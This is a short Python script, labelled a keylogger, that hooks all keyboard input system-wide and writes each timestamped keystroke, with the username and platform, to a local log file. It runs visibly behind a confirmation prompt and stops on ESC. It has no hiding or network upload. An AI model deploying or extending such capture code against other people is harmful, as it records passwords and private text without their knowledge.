import keyboard
import datetime
import sys
from pathlib import Path
import getpass

class KeyboardMonitoringTool:
    def __init__(self):
        self.log_file = "keyboard_log.txt"
        self.start_time = datetime.datetime.now()
        self.is_running = False
        
        # Create logs directory
        self.log_dir = Path("E:/") / "KeyboardMonitor"
        self.log_dir.mkdir(exist_ok=True)
        self.log_path = self.log_dir / self.log_file
        print("\n")
        print("=" * 70)
        print("\t\t\t      KEYLOGGER")
        print("=" * 70)
        print(f"Log directory: {self.log_dir}")
    
    def on_key_event(self, event):
        try:
            timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
            key_name = event.name
            
            if event.event_type == keyboard.KEY_DOWN:
                if len(key_name) == 1:
                    log_entry = f"[{timestamp}] Character: '{key_name}'\n"
                else:
                    log_entry = f"[{timestamp}] Special: {key_name}\n"
                
                # Write to log file
                with open(self.log_path, 'a', encoding='utf-8') as f:
                    f.write(log_entry)
                
        except Exception as e:
            print(f"Error handling: {e}")
    #Start monitoring session
    def start_session(self):                       
        print("\n" + "="*50)
        print("\t\tSESSION SETUP")
        print("="*50)
        print("This session will:")
        print("- Log keystrokes")
        print("- Show real-time data logging")
        
        confirm = input("\nProceed with monitoring session? (y/n): ")
        if confirm.lower() != 'y':
            print("Session cancelled.")
            return False
        
        print("\nStarting keyboard monitor...")
        print("Press ESC to stop session")
        print("-" * 50)
        
        try:
            keyboard.hook(self.on_key_event)
            self.is_running = True
            
            with open(self.log_path, 'w', encoding='utf-8') as f:
                f.write(f"MONITORING SESSION - {self.start_time}\n")
                f.write(f"User: {getpass.getuser()}\n")
                f.write(f"System: {sys.platform}\n")
                f.write("-" * 60 + "\n")
            #wait for ESC
            keyboard.wait('esc')                            
            self.stop_session()
            
        except Exception as e:
            print(f"Error: {e}")
            return False
        
        return True
    #ending monitoring session
    def stop_session(self):                          
        if self.is_running:
            keyboard.unhook_all()
            self.is_running = False
            
            end_time = datetime.datetime.now()
            duration = end_time - self.start_time
            
            # Session summary
            with open(self.log_path, 'a', encoding='utf-8') as f:
                f.write(f"\nSESSION COMPLETED: {end_time}\n")
                f.write(f"DURATION: {duration}\n")
            
            print(f"\nSession completed.")
            print(f"Duration: {duration}")
            print(f"Log file: {self.log_path}")

def main():
    monitor = KeyboardMonitoringTool()
    
    while True:
        print("\nOPTIONS:")
        print("1. Start monitoring session")
        print("2. Exit tool")
        
        try:
            choice = input("Choose option (1-2): ").strip()
            
            if choice == '1':
                monitor.start_session()
            elif choice == '2':
                print("Exiting tool.")
                break
            else:
                print("Please choose a valid option.")
                
        except KeyboardInterrupt:
            print("\nSession interrupted.")
            break
        except Exception as e:
            print(f"Error: {e}")

if __name__ == "__main__":
    # Environment checking
    print("\n")
    print("="*50)
    print("system information:")
    print("="*50)
    print(f"Version: {sys.version}")
    print(f"Platform: {sys.platform}")
    print(f"User: {getpass.getuser()}")
    
    main()

